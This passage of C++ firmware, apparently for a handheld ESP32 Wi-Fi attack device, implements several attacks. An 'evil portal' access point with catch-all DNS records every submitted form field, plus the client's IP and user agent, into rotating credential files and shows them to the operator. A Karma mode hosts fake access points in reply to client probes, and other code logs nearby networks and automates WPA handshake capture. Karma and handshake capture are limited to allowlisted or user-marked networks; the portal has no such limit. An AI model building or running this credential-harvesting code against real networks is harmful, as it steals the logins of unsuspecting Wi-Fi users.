constexpr uint32_t PCAP_MAX_BYTES = 4u * 1024u * 1024u;

int countLines(const char *path) {
    int lines = 0;
    File f = SD.open(path, FILE_READ);
    if (!f) return 0;
    while (f.available()) {
        if (f.read() == '\n') lines++;
    }
    f.close();
    return lines;
}

void appendCapped(const char *path, const String &line) {
    int lines = countLines(path);
    if (lines >= LOG_MAX_ENTRIES) {
        char tmp[96];
        snprintf(tmp, sizeof(tmp), "%s.tmp", path);
        if (SD.exists(tmp)) SD.remove(tmp);
        File src = SD.open(path, FILE_READ);
        File dst = SD.open(tmp, FILE_WRITE);
        bool copied = false;
        if (src && dst) {
            int toSkip = lines - (LOG_MAX_ENTRIES - 1);
            int seen = 0;
            copied = true;
            while (src.available()) {
                int c = src.read();
                if (seen < toSkip) {
                    if (c == '\n') seen++;
                    continue;
                }
                if (dst.write(static_cast<uint8_t>(c)) != 1) {
                    copied = false;  // SD full mid-copy
                    break;
                }
            }
        }
        src.close();
        dst.close();
        if (copied) {
            SD.remove(path);
            SD.rename(tmp, path);
        } else {
            // Copy failed (SD full or unreadable): keep the original log, drop the partial copy.
            if (SD.exists(tmp)) SD.remove(tmp);
        }
    }
    File f = SD.open(path, FILE_APPEND);
    if (f) {
        f.println(line);
        f.close();
    }
}

// Path of the k-th creds file for an SSID: <safe>_creds.csv, then <safe>_creds_2.csv, and so on.
void portalCredsFile(char *out, size_t n, const char *safe, int k) {
    if (k == 1) {
        snprintf(out, n, "%s/%s_creds.csv", PORTAL_CREDS_DIR, safe);
    } else {
        snprintf(out, n, "%s/%s_creds_%d.csv", PORTAL_CREDS_DIR, safe, k);
    }
}

// First in, first out: delete file 1 (the oldest), then move every file down one number.
// That frees the newest slot, PORTAL_CREDS_FILE_MAX, for the next capture.
void rotatePortalCreds(const char *safe) {
    char from[96];
    char to[96];
    portalCredsFile(to, sizeof(to), safe, 1);
    if (SD.exists(to)) SD.remove(to);
    for (int k = 2; k <= PORTAL_CREDS_FILE_MAX; k++) {
        portalCredsFile(from, sizeof(from), safe, k);
        portalCredsFile(to, sizeof(to), safe, k - 1);
        if (SD.exists(from)) {
            if (SD.exists(to)) SD.remove(to);
            SD.rename(from, to);
        }
    }
}

// Where the last capture went. Files before that one were full when the capture moved past
// them, so the next scan starts there instead of re-reading every full file.
char credsCacheSafe[SPAM_SSID_MAX + 1] = "";
int credsCacheK = 0;      // 0 = no cache
int credsCacheLines = 0;  // lines in that file, including the capture written to it

// Picks the file the next capture goes to. When all files are full, the oldest is deleted
// first, so the newest capture is always saved.
void portalCredsPath(char *out, size_t n) {
    char safe[SPAM_SSID_MAX + 1];
    size_t j = 0;
    for (size_t i = 0; deauthSsid[i] != '\0' && j < SPAM_SSID_MAX; i++) {
        char c = deauthSsid[i];
        safe[j++] = (isalnum(static_cast<unsigned char>(c)) || c == '-' || c == '_') ? c : '_';
    }
    safe[j] = '\0';
    bool cached = credsCacheK > 0 && strcmp(credsCacheSafe, safe) == 0;
    if (cached && credsCacheLines < LOG_MAX_ENTRIES) {  // same file as last time, not full yet
        portalCredsFile(out, n, safe, credsCacheK);
        credsCacheLines++;
        return;
    }
    int k = cached ? credsCacheK : 1;
    int lines = 0;
    for (; k <= PORTAL_CREDS_FILE_MAX; k++) {
        portalCredsFile(out, n, safe, k);
        if (!SD.exists(out)) {
            lines = 0;
            break;
        }
        lines = countLines(out);
        if (lines < LOG_MAX_ENTRIES) break;
    }
    if (k > PORTAL_CREDS_FILE_MAX) {
        // Every file is full: delete the oldest and use the freed newest slot.
        rotatePortalCreds(safe);
        k = PORTAL_CREDS_FILE_MAX;
        portalCredsFile(out, n, safe, k);
        lines = 0;
    }
    snprintf(credsCacheSafe, sizeof(credsCacheSafe), "%s", safe);
    credsCacheK = k;
    credsCacheLines = lines + 1;  // the caller writes one line to this file next
}

void portalHandlePost() {
    if (portalServer.args() == 0) {
        portalRedirect();
        return;
    }
    String line = "session: " + String(portalSession) + ", ssid: " + deauthSsid + ", channel: " + String(deauthCh) +
                  ", uptime_min: " + String(millis() / 60000) + ", client_ip: " +
                  portalServer.client().remoteIP().toString() + ", user_agent: " + portalServer.header("User-Agent");
    String lastVal = "";
    for (int i = 0; i < portalServer.args(); i++) {
        String key = portalServer.argName(i);
        String val = portalServer.arg(i);
        line += ", " + key + ": " + val;
        lastVal = val;
    }
    if (!SD.exists(PORTAL_CREDS_DIR)) SD.mkdir(PORTAL_CREDS_DIR);
    char path[96];
    portalCredsPath(path, sizeof(path));
    File f = SD.open(path, FILE_APPEND);
    if (f) {
        f.println(line);
        f.close();
    }
    snprintf(portalCredsName, sizeof(portalCredsName), "%s", path);
    portalCaptured++;
    snprintf(portalLast, sizeof(portalLast), "%s", lastVal.c_str());
    portalServer.send(200, "text/html", "<html><body style=\"font-family:sans-serif\"><p>Connecting, please wait...</p></body></html>");
}

void drawPortal() {
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextSize(1);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    char line[64];
    snprintf(line, sizeof(line), "Evil portal  ch%-2d  %s", deauthCh, portalRunning ? "RUNNING" : "stopped");
    d.drawString(line, 4, 4);
    snprintf(line, sizeof(line), "SSID: %s", deauthSsid);
    d.drawString(line, 4, 16);
    snprintf(line, sizeof(line), "Template: %s", portalTemplateName);
    d.drawString(line, 4, 28);
    snprintf(line, sizeof(line), "Page views %lu  captured %lu", (unsigned long)portalViews,
             (unsigned long)portalCaptured);
    d.drawString(line, 4, 40);
    snprintf(line, sizeof(line), "Last: %s", portalLast);
    d.drawString(line, 4, 52);
    if (portalCredsName[0] != '\0') {
        snprintf(line, sizeof(line), "Saved: %s", portalCredsName);
        d.drawString(line, 4, 64);
    }
    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    d.drawString("Enter start/stop  Bksp back", 4, 124);
}

void startPortal() {
    credsCacheK = 0;  // SD contents may have changed while the portal was off
    if (!ensureSd()) {
        snprintf(portalLast, sizeof(portalLast), "no SD card found");
        return;
    }
    if (!loadPortalPage(portalPage)) {
        portalPage = PORTAL_DEFAULT_PAGE;
        snprintf(portalTemplateName, sizeof(portalTemplateName), "built-in");
    }
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    if (!WiFi.softAP(deauthSsid, nullptr, deauthCh, 0, 4)) {
        snprintf(portalLast, sizeof(portalLast), "softAP failed");
        return;
    }
    if (!portalRoutesAdded) {
        portalServer.on("/", HTTP_GET, portalHandleRoot);
        portalServer.on("/post", HTTP_POST, portalHandlePost);
        portalServer.onNotFound(portalRedirect);
        const char *portalHeaderKeys[] = {"User-Agent"};
        portalServer.collectHeaders(portalHeaderKeys, 1);
        portalRoutesAdded = true;
    }
    portalDns.start(53, "*", WiFi.softAPIP());
    portalServer.begin();
    portalViews = 0;
    portalCaptured = 0;
    portalLast[0] = '\0';
    portalCredsName[0] = '\0';
    portalSession++;
    portalRunning = true;
    portalLastDraw = 0;
}

void stopPortal() {
    if (!portalRunning) return;
    portalRunning = false;
    portalServer.stop();
    portalDns.stop();
    WiFi.softAPdisconnect(false);
}

void tickPortal() {
    if (!portalRunning) return;
    portalServer.handleClient();
    uint32_t now = millis();
    if (now - portalLastDraw >= 1000) {
        portalLastDraw = now;
        if (screen == Screen::WifiPortalRun) drawPortal();
    }
}

constexpr int CREDS_FILES_MAX = PORTAL_CREDS_FILE_MAX;
constexpr int CREDS_ENTRIES_MAX = 60;
constexpr int CREDS_WRAP = 38;
char credsFileNames[CREDS_FILES_MAX][40];
int credsFileCount = 0;
int credsFileSel = 0;
String credsEntries[CREDS_ENTRIES_MAX];
int credsEntryCount = 0;
int credsEntrySel = 0;
String credsStatus = "";

void scanCredsFiles() {
    credsFileCount = 0;
    credsFileSel = 0;
    credsStatus = "";
    if (!ensureSd()) {
        credsStatus = "no SD card found";
        return;
    }
    if (!SD.exists(PORTAL_CREDS_DIR)) {
        credsStatus = "no captures yet";
        return;
    }
    File dir = SD.open(PORTAL_CREDS_DIR);
    File f = dir.openNextFile();
    while (f && credsFileCount < CREDS_FILES_MAX) {
        if (!f.isDirectory()) {
            String name = String(f.name());
            int slash = name.lastIndexOf('/');
            if (slash >= 0) name = name.substring(slash + 1);
            if (name.endsWith(".csv")) {
                snprintf(credsFileNames[credsFileCount], sizeof(credsFileNames[0]), "%s", name.c_str());
                credsFileCount++;
            }
        }
        f.close();
        f = dir.openNextFile();
    }
    dir.close();
    if (credsFileCount == 0) credsStatus = "no captures yet";
}

void openCredsFile(int idx) {
    char path[80];
    snprintf(path, sizeof(path), "%s/%s", PORTAL_CREDS_DIR, credsFileNames[idx]);
    credsEntryCount = 0;
    File f = SD.open(path, FILE_READ);
    if (!f) {
        credsStatus = "could not open file";
        return;
    }
    while (f.available()) {
        String line = f.readStringUntil('\n');
        line.trim();
        if (line.length() == 0) continue;
        if (credsEntryCount < CREDS_ENTRIES_MAX) {
            credsEntries[credsEntryCount++] = line;
        } else {
            for (int i = 1; i < CREDS_ENTRIES_MAX; i++) credsEntries[i - 1] = credsEntries[i];
            credsEntries[CREDS_ENTRIES_MAX - 1] = line;
        }
    }
    f.close();
    credsEntrySel = credsEntryCount > 0 ? credsEntryCount - 1 : 0;
}

void drawCredsFiles() {
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextSize(1);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    char header[40];
    snprintf(header, sizeof(header), "Captured creds: %d files", credsFileCount);
    d.drawString(header, 4, 4);
    if (credsStatus.length() > 0) {
        d.drawString(credsStatus.c_str(), 4, 20);
    }
    int top = credsFileSel > 8 ? credsFileSel - 8 : 0;
    for (int i = top; i < credsFileCount && i < top + 9; i++) {
        int y = 20 + (i - top) * 11;
        if (i == credsFileSel) {
            d.fillRect(0, y - 1, d.width(), 10, COLOR_PRIMARY);
            d.setTextColor(COLOR_BG, COLOR_PRIMARY);
        } else {
            d.setTextColor(COLOR_PRIMARY, COLOR_BG);
        }
        d.drawString(credsFileNames[i], 4, y);
    }
    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    d.drawString("Enter open  Bksp back", 4, 124);
}

void drawCredsView() {
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextSize(1);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    char header[48];
    if (credsEntryCount == 0) {
        snprintf(header, sizeof(header), "No entries in file");
        d.drawString(header, 4, 4);
    } else {
        snprintf(header, sizeof(header), "Entry %d/%d", credsEntrySel + 1, credsEntryCount);
        d.drawString(header, 4, 4);
        const String &e = credsEntries[credsEntrySel];
        int y = 16;
        int row = 0;
        for (int pos = 0; pos < static_cast<int>(e.length()) && row < 9; pos += CREDS_WRAP, row++) {
            int n = e.length() - pos;
            if (n > CREDS_WRAP) n = CREDS_WRAP;
            String part = e.substring(pos, pos + n);
            d.drawString(part.c_str(), 4, y);
            y += 11;
        }
    }
    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    d.drawString("; prev  . next  Bksp files", 4, 124);
}

constexpr uint32_t KARMA_HOST_MS = 90000;
constexpr int KARMA_ALLOW_MAX = 16;
constexpr char KARMA_ALLOW_PATH[] = "/kaiju/karma_allow.txt";
constexpr char KARMA_LOG_PATH[] = "/kaiju/karma_log.txt";
uint8_t karmaAllow[KARMA_ALLOW_MAX][6];
int karmaAllowCount = 0;
bool karmaHosting = false;
uint32_t karmaHostEnd = 0;
uint32_t karmaHostCount = 0;

void loadKarmaAllowlist() {
    karmaAllowCount = 0;
    if (!ensureSd() || !SD.exists(KARMA_ALLOW_PATH)) return;
    File f = SD.open(KARMA_ALLOW_PATH, FILE_READ);
    if (!f) return;
    while (f.available() && karmaAllowCount < KARMA_ALLOW_MAX) {
        String line = f.readStringUntil('\n');
        line.trim();
        unsigned int b[6];
        if (sscanf(line.c_str(), "%x:%x:%x:%x:%x:%x", &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) == 6) {
            for (int i = 0; i < 6; i++) karmaAllow[karmaAllowCount][i] = static_cast<uint8_t>(b[i]);
            karmaAllowCount++;
        }
    }
    f.close();
}

bool karmaAllowed(const uint8_t *mac) {
    for (int i = 0; i < karmaAllowCount; i++) {
        if (memcmp(karmaAllow[i], mac, 6) == 0) return true;
    }
    return false;
}

void macToStr(const uint8_t *m, char *out, size_t n) {
    snprintf(out, n, "%02x:%02x:%02x:%02x:%02x:%02x", m[0], m[1], m[2], m[3], m[4], m[5]);
}

void karmaLogAppend(const KarmaReq &r) {
    if (!ensureSd()) return;
    if (!SD.exists("/kaiju")) SD.mkdir("/kaiju");
    char mac[18];
    macToStr(r.mac, mac, sizeof(mac));
    appendCapped(KARMA_LOG_PATH, String("uptime_min: ") + String(millis() / 60000) + ", hosted: " + r.ssid +
                                     ", ch: " + String(r.ch) + ", client: " + mac);
}

void startKarmaSniff() {
    if (WiFi.getMode() == WIFI_MODE_NULL) WiFi.mode(WIFI_STA);
    setAnalyzerChannel(karmaCh);
    wifi_promiscuous_filter_t filter = {WIFI_PROMIS_FILTER_MASK_MGMT};
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(&onKarma);
    esp_wifi_set_promiscuous(true);
}

void stopKarmaSniff() {
    esp_wifi_set_promiscuous(false);
}

void drawKarmaRun() {
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextSize(1);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    char line[64];
    const char *state = karmaRunning ? "RUNNING" : "stopped";
    if (karmaHosting) {
        snprintf(line, sizeof(line), "Karma HOSTING  ch%-2d", deauthCh);
    } else if (karmaHop) {
        snprintf(line, sizeof(line), "Karma hunt  hop 1-%d  %s", KARMA_CH_MAX, state);
    } else {
        snprintf(line, sizeof(line), "Karma hunt  ch%-2d  %s", karmaCh, state);
    }
    d.drawString(line, 4, 4);
    if (karmaHosting) {
        snprintf(line, sizeof(line), "SSID: %s", deauthSsid);
        d.drawString(line, 4, 16);
        uint32_t left = karmaHostEnd > millis() ? (karmaHostEnd - millis()) / 1000 : 0;
        snprintf(line, sizeof(line), "%lus left  portal views %lu", (unsigned long)left, (unsigned long)portalViews);
        d.drawString(line, 4, 28);
    } else {
        snprintf(line, sizeof(line), "Probes seen %lu", (unsigned long)karmaSeen.load(std::memory_order_relaxed));
        d.drawString(line, 4, 16);
        snprintf(line, sizeof(line), "Allowed MACs: %d", karmaAllowCount);
        d.drawString(line, 4, 28);
    }
    snprintf(line, sizeof(line), "Hosted %lu", (unsigned long)karmaHostCount);
    d.drawString(line, 4, 40);
    if (karmaAllowCount == 0) {
        d.setTextColor(COLOR_SECONDARY, COLOR_BG);
        d.drawString("No allowlist: nothing will host", 4, 52);
        d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    }
    snprintf(line, sizeof(line), "Last: %s", karmaLast);
    d.drawString(line, 4, 64);
    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    d.drawString("Enter run  H hop  ;. ch  Bksp back", 4, 124);
}

uint8_t karmaHostMac[6];
int karmaHostCh = 0;

void startKarmaHost(const KarmaReq &r) {
    stopKarmaSniff();
    snprintf(deauthSsid, sizeof(deauthSsid), "%s", r.ssid);
    deauthCh = r.ch;
    memcpy(karmaHostMac, r.mac, 6);
    karmaHostCh = r.ch;
    startPortal();
    if (!portalRunning) {
        snprintf(karmaLast, sizeof(karmaLast), "host failed: %s", portalLast);
        startKarmaSniff();
        return;
    }
    karmaHosting = true;
    karmaHostEnd = millis() + KARMA_HOST_MS;
    karmaHostCount++;
    snprintf(karmaLast, sizeof(karmaLast), "%s", r.ssid);
    drawKarmaRun();
}

void logKarmaHostIfUseful() {
    if (portalCaptured == 0) return;
    KarmaReq r;
    memcpy(r.mac, karmaHostMac, 6);
    r.ch = static_cast<uint8_t>(karmaHostCh);
    snprintf(r.ssid, sizeof(r.ssid), "%s", deauthSsid);
    karmaLogAppend(r);
}

void endKarmaHost() {
    logKarmaHostIfUseful();
    stopPortal();
    karmaHosting = false;
    startKarmaSniff();
    drawKarmaRun();
}

void startKarma() {
    loadKarmaAllowlist();
    karmaQHead.store(0, std::memory_order_release);
    karmaQTail.store(0, std::memory_order_release);
    karmaSeen.store(0, std::memory_order_relaxed);
    karmaHostCount = 0;
    karmaLast[0] = '\0';
    karmaLastDraw = 0;
    karmaDwellStart = millis();
    karmaRunning = true;
    startKarmaSniff();
    drawKarmaRun();
}

void stopKarma() {
    if (!karmaRunning) return;
    if (karmaHosting) {
        logKarmaHostIfUseful();
        stopPortal();
        karmaHosting = false;
    }
    stopKarmaSniff();
    karmaRunning = false;
}

void tickKarma() {
    if (!karmaRunning) return;
    uint32_t now = millis();
    if (karmaHosting) {
        tickPortal();
        if (now >= karmaHostEnd) {
            endKarmaHost();
        } else if (now - karmaLastDraw >= 1000) {
            karmaLastDraw = now;
            drawKarmaRun();
        }
        return;
    }
    if (karmaHop && now - karmaDwellStart >= KARMA_DWELL_MS) {
        karmaDwellStart = now;
        karmaCh = karmaCh >= KARMA_CH_MAX ? CH_FIRST : karmaCh + 1;
        setAnalyzerChannel(karmaCh);
    }
    uint32_t tail = karmaQTail.load(std::memory_order_relaxed);
    uint32_t head = karmaQHead.load(std::memory_order_acquire);
    bool started = false;
    while (tail != head && !started) {
        KarmaReq r = karmaQ[tail % KARMA_QUEUE];
        tail++;
        karmaQTail.store(tail, std::memory_order_release);
        snprintf(karmaLast, sizeof(karmaLast), "%s", r.ssid);
        if (karmaAllowed(r.mac)) {
            started = true;
            karmaQTail.store(head, std::memory_order_release);
            startKarmaHost(r);
        }
    }
    if (now - karmaLastDraw >= 1000 && !karmaHosting) {
        karmaLastDraw = now;
        drawKarmaRun();
    }
}

constexpr int AP_TABLE_MAX = 64;
constexpr int AUTO_SSID_MAX = 32;
constexpr uint32_t AUTO_SCOUT_MS = 60000;
constexpr uint32_t AUTO_HUNT_MS = 90000;
constexpr uint32_t AUTO_DEAUTH_MS = 30000;
constexpr uint32_t AUTO_HOP_MS = 400;
constexpr uint32_t AUTO_BURST_MS = 300;
constexpr uint8_t AUTO_MAX_TRIES = 2;   // hunts per network per session
constexpr char WARDRIVE_PATH[] = "/kaiju/wardrive.csv";

struct ApRec {
    uint8_t bssid[6];
    char ssid[AUTO_SSID_MAX + 1];
    uint8_t ch;
    int8_t rssi;
    uint8_t flags;
    bool logged;
    bool captured;
    uint8_t tries;
};
ApRec apTable[AP_TABLE_MAX];
std::atomic<int> apCount{0};

enum class AutoStage : uint8_t { IDLE, SCOUT, REVIEW, HUNT, FINISHED };
AutoStage autoStage = AutoStage::IDLE;
uint32_t autoStageStart = 0;
uint32_t autoLastHop = 0;
uint32_t autoLastBurst = 0;
uint32_t autoLastDraw = 0;
uint32_t autoLastOkAt = 0;
int autoHopCh = CH_FIRST;
int autoTarget = -1;
uint32_t autoCaptures = 0;
char autoMsg[48] = "";
char autoFile[40] = "";

const char *authText(uint8_t f) {
    if (!(f & CHK_RSN)) return "open";
    if (f & CHK_SAE) return (f & CHK_PSK) ? "WPA2/3" : "WPA3";
    return "WPA2";
}

void onAutoScout(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    auto *pkt = static_cast<wifi_promiscuous_pkt_t *>(buf);
    uint32_t len = pkt->rx_ctrl.sig_len;
    if (len < 40 || ((pkt->payload[0] >> 4) & 0xF) != 0x8) return;
    const uint8_t *bssid = &pkt->payload[16];
    int count = apCount.load(std::memory_order_relaxed);
    int idx = -1;
    for (int i = 0; i < count; i++) {
        if (memcmp(apTable[i].bssid, bssid, 6) == 0) {
            idx = i;
            break;
        }
    }
    if (idx < 0) {
        if (count >= AP_TABLE_MAX) return;
        idx = count;
        memcpy(apTable[idx].bssid, bssid, 6);
        apTable[idx].ssid[0] = '\0';
        apTable[idx].flags = 0;
        apTable[idx].logged = false;
        apTable[idx].captured = false;
        apTable[idx].tries = 0;
        apCount.store(count + 1, std::memory_order_release);
    }
    uint32_t end = len - 4;
    uint32_t q = 36;
    if (apTable[idx].ssid[0] == '\0' && q + 2 <= end && pkt->payload[q] == 0) {
        uint32_t n = pkt->payload[q + 1];
        if (n > 0 && n <= AUTO_SSID_MAX && q + 2 + n <= end) {
            memcpy(apTable[idx].ssid, &pkt->payload[q + 2], n);
            apTable[idx].ssid[n] = '\0';
        }
    }
    apTable[idx].ch = pkt->rx_ctrl.channel;
    apTable[idx].rssi = pkt->rx_ctrl.rssi;
    apTable[idx].flags |= parseBeaconFlags(pkt, len);
}

void autoLogNew() {
    int count = apCount.load(std::memory_order_acquire);
    int written = 0;
    for (int i = 0; i < count && written < 3; i++) {
        if (apTable[i].logged) continue;
        apTable[i].logged = true;
        written++;
        char mac[18];
        snprintf(mac, sizeof(mac), "%02x:%02x:%02x:%02x:%02x:%02x", apTable[i].bssid[0], apTable[i].bssid[1],
                 apTable[i].bssid[2], apTable[i].bssid[3], apTable[i].bssid[4], apTable[i].bssid[5]);
        String line = String(static_cast<int>(millis() / 60000)) + "m, " + mac + ", " + apTable[i].ssid + ", ch" +
                      String(static_cast<int>(apTable[i].ch)) + ", " + String(static_cast<int>(apTable[i].rssi)) +
                      " dBm, " + authText(apTable[i].flags) + ", " + verdictTag(computeVerdict(apTable[i].flags));
        appendCapped(WARDRIVE_PATH, line);
    }
}

bool huntCrackable() {
    uint32_t m1 = hsMsgCount[1].load(std::memory_order_relaxed);
    uint32_t m2 = hsMsgCount[2].load(std::memory_order_relaxed);
    uint32_t m3 = hsMsgCount[3].load(std::memory_order_relaxed);
    return m2 > 0 && (m1 > 0 || m3 > 0);
}

int pickAutoTarget() {
    int count = apCount.load(std::memory_order_acquire);
    int best = -1;
    for (int i = 0; i < count; i++) {
        const ApRec &a = apTable[i];
        if (a.captured || a.tries >= AUTO_MAX_TRIES || !(a.flags & CHK_SEEN)) continue;
        if (!isOwnBssid(a.bssid)) continue;
        if (!verdictAllowsDeauth(computeVerdict(a.flags))) continue;
        if (best < 0 || a.rssi > apTable[best].rssi) best = i;
    }
    return best;
}

void stopAutoRadio() {
    esp_wifi_set_promiscuous(false);
}

void startAutoScout() {
    autoStage = AutoStage::SCOUT;
    autoStageStart = millis();
    autoLastHop = 0;
    setAnalyzerChannel(autoHopCh);
    wifi_promiscuous_filter_t filter = {WIFI_PROMIS_FILTER_MASK_MGMT};
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(&onAutoScout);
    esp_wifi_set_promiscuous(true);
}

void startAutoHunt(int idx) {
    stopAutoRadio();
    autoTarget = idx;
    memcpy(deauthBssid, apTable[idx].bssid, 6);
    snprintf(deauthSsid, sizeof(deauthSsid), "%s", apTable[idx].ssid);
    deauthCh = apTable[idx].ch;
    setAnalyzerChannel(deauthCh);
    for (auto &c : hsMsgCount) c.store(0, std::memory_order_relaxed);
    hsEapolTotal.store(0, std::memory_order_relaxed);
    hsDataSeen.store(0, std::memory_order_relaxed);
    hsBeaconSaved.store(false, std::memory_order_relaxed);
    startPcap("auto");
    if (!pcapActive.load(std::memory_order_acquire)) {
        autoTarget = -1;
        snprintf(autoMsg, sizeof(autoMsg), "no SD card: not hunting");
        autoStage = AutoStage::FINISHED;
        return;
    }
    wifi_promiscuous_filter_t filter = {WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA};
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(&onHandshake);
    esp_wifi_set_promiscuous(true);
    autoStage = AutoStage::HUNT;
    autoStageStart = millis();
    autoLastBurst = 0;
    snprintf(autoMsg, sizeof(autoMsg), "hunting %.20s", deauthSsid);
}

void autoNextTest();

void endAutoHunt(bool ok) {
    stopAutoRadio();
    delay(20);
    char path[64];
    snprintf(path, sizeof(path), "/pcap/%s", pcapName);
    stopPcap();
    if (ok) {
        snprintf(autoFile, sizeof(autoFile), "%s", pcapName);
        apTable[autoTarget].captured = true;
        autoCaptures++;
        autoLastOkAt = millis();
        snprintf(autoMsg, sizeof(autoMsg), "got one: %.20s", deauthSsid);
    } else {
        if (SD.exists(path)) SD.remove(path);
        apTable[autoTarget].tries++;
        snprintf(autoMsg, sizeof(autoMsg), "no handshake: %.16s", deauthSsid);
    }
    autoTarget = -1;
    autoNextTest();
}

int autoSel = 0;
int autoTop = 0;
uint32_t autoCapturesAtTestStart = 0;
constexpr int AUTO_REVIEW_ROWS = 6;

void toggleOwnBssid(const uint8_t *b) {
    for (int i = 0; i < ownCount; i++) {
        if (memcmp(ownBssid[i], b, 6) == 0) {
            for (int j = i + 1; j < ownCount; j++) memcpy(ownBssid[j - 1], ownBssid[j], 6);
            ownCount--;
            saveOwnList();
            return;
        }
    }
    if (ownCount >= OWN_MAX) return;
    memcpy(ownBssid[ownCount], b, 6);
    ownCount++;
    saveOwnList();
}

void sortAutoTable() {
    int count = apCount.load(std::memory_order_relaxed);
    for (int i = 1; i < count; i++) {
        ApRec tmp = apTable[i];
        int j = i - 1;
        while (j >= 0 && apTable[j].rssi < tmp.rssi) {
            apTable[j + 1] = apTable[j];
            j--;
        }
        apTable[j + 1] = tmp;
    }
}

void autoNextTest() {
    int t = pickAutoTarget();
    if (t < 0) {
        autoTarget = -1;
        autoStage = AutoStage::FINISHED;
        return;
    }
    startAutoHunt(t);
}

void enterReview() {
    stopAutoRadio();
    sortAutoTable();
    autoSel = 0;
    autoTop = 0;
    autoStage = AutoStage::REVIEW;
    snprintf(autoMsg, sizeof(autoMsg), "%s", "mark yours with O, then Enter");
}

void startAutoTest() {
    int t = pickAutoTarget();
    if (t < 0) {
        int count = apCount.load(std::memory_order_relaxed);
        int marked = 0;
        for (int i = 0; i < count; i++) {
            if (isOwnBssid(apTable[i].bssid)) marked++;
        }
        if (marked == 0) {
            snprintf(autoMsg, sizeof(autoMsg), "%s", "mark yours with O first");
        } else {
            snprintf(autoMsg, sizeof(autoMsg), "%s", "marked ones are PMF, done, or tried twice");
        }
        return;
    }
    autoCapturesAtTestStart = autoCaptures;
    startAutoHunt(t);
}

void startKaijugotchi() {
    attackRadio();
    loadOwnList();
    if (ensureSd() && !SD.exists("/kaiju")) SD.mkdir("/kaiju");
    apCount.store(0, std::memory_order_relaxed);
    autoCaptures = 0;
    autoCapturesAtTestStart = 0;
    autoLastOkAt = 0;
    autoFile[0] = '\0';
    autoSel = 0;
    autoTop = 0;
    if (ensureSd()) {
        snprintf(autoMsg, sizeof(autoMsg), "%s", "scanning all networks");
    } else {
        snprintf(autoMsg, sizeof(autoMsg), "%s", "no SD card: nothing saved");
    }
    startAutoScout();
}

void stopKaijugotchi() {
    if (autoStage == AutoStage::HUNT) {
        char path[64];
        snprintf(path, sizeof(path), "/pcap/%s", pcapName);
        stopAutoRadio();
        delay(20);
        stopPcap();
        if (SD.exists(path)) SD.remove(path);
        if (autoTarget >= 0) apTable[autoTarget].tries++;  // an aborted hunt counts as a try
    } else if (autoStage == AutoStage::SCOUT) {
        stopAutoRadio();
    }
    autoStage = AutoStage::IDLE;
    autoTarget = -1;
    snprintf(autoMsg, sizeof(autoMsg), "%s", "stopped");
}

void drawAutoReview() {
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextSize(1);
    int count = apCount.load(std::memory_order_relaxed);
    int marked = 0;
    for (int i = 0; i < count; i++) {
        if (isOwnBssid(apTable[i].bssid)) marked++;
    }
    char line[64];
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    snprintf(line, sizeof(line), "REVIEW  %d found  %d marked yours", count, marked);
    d.drawString(line, 4, 4);
    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    d.drawString(autoMsg, 4, 16);
    if (count == 0) d.drawString("No networks seen. Bksp, then retry.", 4, 30);
    for (int row = 0; row < AUTO_REVIEW_ROWS; row++) {
        int idx = autoTop + row;
        if (idx >= count) break;
        const ApRec &a = apTable[idx];
        snprintf(line, sizeof(line), "%c%c%-12.12s %-5s %4d", idx == autoSel ? '>' : ' ',
                 isOwnBssid(a.bssid) ? '*' : ' ', a.ssid[0] != '\0' ? a.ssid : "<hidden>",
                 verdictTag(computeVerdict(a.flags)), static_cast<int>(a.rssi));
        d.setTextColor(COLOR_PRIMARY, COLOR_BG);
        d.drawString(line, 4, 30 + row * 12);
    }
    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    d.drawString("O mark yours   Enter test marked", 4, 110);
    d.drawString("Bksp back", 4, 124);
}

void drawAutoDone() {
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextSize(2);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    d.drawString("TEST DONE", 6, 6);
    d.setTextSize(1);
    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    char line[64];
    snprintf(line, sizeof(line), "Handshakes this test: %lu",
             static_cast<unsigned long>(autoCaptures - autoCapturesAtTestStart));
    d.drawString(line, 6, 40);
    snprintf(line, sizeof(line), "%s", autoMsg);
    d.drawString(line, 6, 56);
    d.drawString("Failed hunts left no files.", 6, 72);
    d.drawString("Enter: review   Bksp back", 6, 124);
}

void drawKaijugotchi() {
    if (autoStage == AutoStage::REVIEW) {
        drawAutoReview();
        return;
    }
    if (autoStage == AutoStage::FINISHED) {
        drawAutoDone();
        return;
    }
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    uint32_t now = millis();
    const char *stage = autoStage == AutoStage::HUNT ? "TESTING" : (autoStage == AutoStage::SCOUT ? "SCANNING" : "READY");
